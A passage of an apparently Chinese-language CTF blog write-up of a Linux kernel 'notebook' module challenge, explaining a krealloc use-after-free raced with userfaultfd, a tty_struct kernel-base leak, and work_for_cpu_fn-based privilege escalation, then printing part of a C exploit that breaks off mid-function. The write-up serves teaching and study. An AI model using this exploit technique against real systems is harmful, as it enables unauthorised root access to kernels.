class="hljs-string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);<br>    <span class="hljs-keyword">return</span> v8;<br>  &#125;<br>  v4 = v3;<br>  v5 = &amp;notebook[idx];<br>  raw_read_lock(&amp;lock);<br>  size = v5-&gt;size;<br>  v5-&gt;size = newsize;<br>  <span class="hljs-keyword">if</span> ( size == newsize )<br>  &#123;<br>    v8 = <span class="hljs-number">1LL</span>;<br>    <span class="hljs-keyword">goto</span> editout;<br>  &#125;<br>  v7 = (*krealloc.gap0)(v5-&gt;note, newsize, <span class="hljs-number">37748928LL</span>); <span class="hljs-comment">//用于重新为让p执行一段新申请的内存，但是保持p指针指向内存中的内容不变，通俗讲就是为p重新申请一段内存，再将p之前内存中的内容复制过来.如果说此时newsize为0,则会释放该堆块，且不做任何操作</span><br>  copy_from_user(name, v4, <span class="hljs-number">256LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v5-&gt;size ) <span class="hljs-comment">//传0是不阔以哒</span><br>  &#123;<br>    printk(<span class="hljs-string">&quot;free in fact&quot;</span>);<br>    v5-&gt;note = <span class="hljs-number">0LL</span>;<br>    v8 = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-keyword">goto</span> editout;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( _virt_addr_valid(v7) )<br>  &#123;<br>    v5-&gt;note = v7;<br>    v8 = <span class="hljs-number">2LL</span>;<br>editout:<br>    raw_read_unlock(&amp;lock);<br>    printk(<span class="hljs-string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);<br>    <span class="hljs-keyword">return</span> v8;<br>  &#125;<br>  printk(<span class="hljs-string">&quot;[x] Return ptr unvalid.\n&quot;</span>);<br>  raw_read_unlock(&amp;lock);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">3LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-利用思路"><a href="#3-利用思路" class="headerlink" title="3. 利用思路"></a>3. 利用思路</h3><p>Krealloc , pwn:v:肯定有点熟悉这个realloc，在这里也是类似的，他的功能就是重新分配堆块，如果传入size为0，则会释放掉他。</p><p>我们之前经过分析，这个notedel好像可以使得size为0，然后UAF，事实上也确实如此。</p><p>接下来我们试想这样一个场景：</p><ol><li>存在线程1，线程2，并且其都会通过<code>copy from user</code> or <code>copy to user</code> for accessing the userland.</li><li>也就是说可以满足我们访问用户区域的条件，此时虽然存在多线程问题，但是触发条件十分艰巨，也就是说我们想要触发我们希望的修改条件，让他们自己跑的话是十分复杂且困难的，就拿两个线程来说，我们需要满足线程1在执行完语句n之后，需要线程2立刻执行自己区域的语句z，然后再回到线程1执行n+1.我们可以料想到这是有多么复杂</li><li>一切都要归于时间片，他实在是太短且不太好预测，所以线程切换的时间也不是我们可以任意控制的，因此我们可以想到，如果让线程1再执行到需要语句的时候即使阻塞呢，然后再调用了线程2，这样就可以达成我们需要的调用链</li><li>因此这里我们采用<code>userfaultfd</code>来达成该效果，调用监听线程来使得某线程阻塞，无限拉大线程切换的过程，使我们有足够的时间来做小动作</li></ol><h3 id="4-漏洞利用-1"><a href="#4-漏洞利用-1" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>:one:  使用mmap构造匿名映射区域，将其传入内核，并且将该区域使用userfaultfd来进行监控，到适当时间我们就将他阻塞</p><p>:two:  在noteedit的时候，我们如果传入size为0，他会调用krealloc来将我们原本的note-&gt;note块释放，然后他会调用<code>copy_from_user</code>函数，会访问我们用户传入的指针，然后监控线程检测到缺页访问，因此挂起该线程执行操作，但此时我们的note-&gt;note是仍然为释放后的堆地址的，且size位为0，因此就达成了一个UAF的条件 ，但是这里我们仍需要将size位置为非零值，因为我们总是要结束线程的，即使他理论上可以延长无限值。如果结束userfaultfd的时候size仍然为0，则按照ida反编译的情况来查看，他会覆盖掉我们的UAF地址，这样就会出现一个非预期错误。</p><img src="/2023/06/24/Linux-Kernel-0x02-Practice/krealloc.png" class=""><p>然后size的修改我们采用noteadd函数当中的值，我们发现他是先修改掉size，然后会有个与用户交换数据的过程，此时我们再触发一次<code>userfaultfd</code>就可以了</p><img src="/2023/06/24/Linux-Kernel-0x02-Practice/noteadd.png" class=""><p>:three:  此时如果我们在之前的note的大小为我们特殊构造的话，例如0x2e0，此时我们可以利用<code>tty_struct</code>来泄露内核的基地址，所以我们此时选则打开ptmx设备，而我们的tty_struct本身是可以泄露内核基地址的，在初始化tty_struct的时候，其中的<code>tty_opreations</code>会初始化为<code>ptm_unix98_ops</code>或<code>pty_unix98_ops</code>这两个全局变量，是谁是随机的，所以我们需要有一个判断，这里有一个坑点是我们从<code>objdump -d vmlinux &gt; symtable</code>中的symtable是找不出这两个全局变量的，我们可以把vmlinunx拖入ida中来查找</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f9198618367adab40971a88cced4b31c8601e458.jpg"></p><p>这里有个难以理解的点就是，我们的tty_struct可能存在分配失败的情况，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc0393dc5077913f8794a5c2265c.jpg"></p><p>:four: 当我们构造了UAF的<code>tty_struct</code>后,我们就可以将我们的<code>fake_operations</code>布置在我们的notebook数组当中，这样我们可以任意修改其中的函数指针，就可以尽情的利用它了！</p><p>:five: 但是本题基本上能开的保护差不多都开了，所以我们的链条有点难构造，这里有一个小tips，介绍一种在多核内核下基本存在的一个函数<code>work_for_cpu_fn</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">work_for_cpu_fn</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  _fentry__();<br>  result = (*(a1 + <span class="hljs-number">0x20</span>))(*(a1 + <span class="hljs-number">0x28</span>));<br>  *(a1 + <span class="hljs-number">0x30</span>) = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现该函数的一个功能就是调用*(rdi+0x20)(rdi + 0x28)这个函数，然后我们的返回值存放在(rdi+0x30)当中，而我们的<code>file_operations</code>上的函数第一个参数一般都是<code>tty__struct</code>,所以说我们就可以分次来调用<code>preapare_kernel_cred(NULL)</code>和<code>commit_creds()</code>来进行提权，然后我们只需要<strong>正常的返回用户态即可</strong>，并不需要进行ROP里面的各类绕过，不用找那么多gadget了，很舒服。</p><p>:six: 最后我们需要恢复之前的tty_struct就正常返回调用<code>system</code>就可以了</p><h3 id="5-结果-amp-Exploit"><a href="#5-结果-amp-Exploit" class="headerlink" title="5.结果&amp;Exploit"></a>5.结果&amp;Exploit</h3><p><img src="http://imgsrc.baidu.com/forum/pic/item/8435e5dde71190efcaf52e108b1b9d16fcfa60f7.jpg"></p><p>如图，可达成稳定提权，下面就是本次的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> errExit(msg) do&#123; perror(msg); exit(EXIT_FAILURE); \</span><br><span class="hljs-meta">                    &#125; while(0)</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> note_fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> tty_fd = <span class="hljs-number">0</span>;<br><span class="hljs-type">sem_t</span> evil_add_sem, evil_edit_sem;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span>* page = <span class="hljs-string">&quot;abcd&quot;</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> page_size;<br><br><span class="hljs-type">size_t</span> PTM_UNIX98_OPS = <span class="hljs-number">0xFFFFFFFF81E8E440</span>;<br><span class="hljs-type">size_t</span> PTY_UNIX98_OPS = <span class="hljs-number">0xFFFFFFFF81E8E320</span>;<br><span class="hljs-type">size_t</span> WORK_FOR_CPU_FN = <span class="hljs-number">0xffffffff8109eb90</span>;<br><span class="hljs-type">size_t</span> PREPARE_KERNEL_CRED = <span class="hljs-number">0xffffffff810a9ef0</span>;<br><span class="hljs-type">size_t</span> COMMIT_CREDS = <span class="hljs-number">0xffffffff810a9b40</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span>&#123;</span><br>  <span class="hljs-type">size_t</span> idx;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-type">void</span>* buf;<br>&#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">addnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">editnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">deletenote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  info_log(<span class="hljs-string">&quot;States has been saved successfully!&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    info_log(<span class="hljs-string">&quot;CPU bind succesfully&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">userfaultfd_attack</span><span class="hljs-params">(<span class="hljs-type">char</span>* addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span>&#123;<br>  PRINT_ADDR(<span class="hljs-string">&quot;starting to monitor&quot;</span>, addr);<br>  <span class="hljs-type">long</span> uffd;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>  <span class="hljs-type">pthread_t</span> monitor_thread;<br>  <span class="hljs-type">int</span> s;<br><br>  <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>  <span class="hljs-keyword">if</span>(uffd == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>  uffdio_api.api = UFFD_API;<br>  uffdio_api.features = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br>  uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>  uffdio_register.range.len = len;<br>  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>  <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>    errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>  <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>  s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd);<br>  <br>  info_log(<span class="hljs-string">&quot;create thread...&quot;</span>);<br>  <span class="hljs-keyword">if</span>(s != <span class="hljs-number">0</span>)&#123;<br>    errno = s;<br>    errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span>* <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> * arg)</span>&#123;<br>  <span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span> <span class="hljs-comment">/* data read from userfaultfd */</span><br>  <span class="hljs-type">static</span> <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>  <span class="hljs-type">long</span> uffd;        <span class="hljs-comment">/* userfaultfd file descriptor */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>  <span class="hljs-type">ssize_t</span> nread;<br><br>  uffd = (<span class="hljs-type">long</span>)arg;<br><br>  <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd file descriptor */</span><br>  <span class="hljs-keyword">for</span>(;;)&#123;<br>    <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    <span class="hljs-type">int</span> nready;<br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br>    nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">if</span>(nready == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>    <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br>    info_log(<span class="hljs-string">&quot;catch the user page fault!&quot;</span>);<br>    nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>    sleep(<span class="hljs-number">10000</span>);<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>    <span class="hljs-comment">/* We expect only one king of evenr; verify that assuption */</span><br>    <span class="hljs-keyword">if</span>(msg.event != UFFD_EVENT_PAGEFAULT)&#123;<br>      <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* copy things to the addr */</span><br><br>    uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>    <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">     * So, round faulting address down to page boundary */</span><br>    uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="hljs-number">1</span>);<br><br>    uffdio_copy.len = page_size;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">addnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = idx;<br>  userargs.size = size;<br>  userargs.buf = buf;<br>  ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = <span class="hljs-number">0</span>;<br>  userargs.size = <span class="hljs-number">10</span>;<br>  userargs.buf = buf;<br>  ioctl(note_fd, <span class="hljs-number">0x64</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editnote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = idx;<br>  userargs.size = size;<br>  userargs.buf = buf;<br>  ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deletenote</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">userargs</span>;</span><br>  userargs.idx = idx;<br>  userargs.size = <span class="hljs-number">0x10</span>;<br>  userargs.buf = <span class="hljs-number">0</span>;<br>  ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;userargs);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">thread_add</span><span class="hljs-params">(<span class="hljs-type">void</span>* uffd_arg)</span>&#123;<br>  sem_wait(&amp;evil_add_sem);<br>  addnote(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_arg);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">thread_edit</span><span class="hljs-params">(<span class="hljs-type">void</span>* 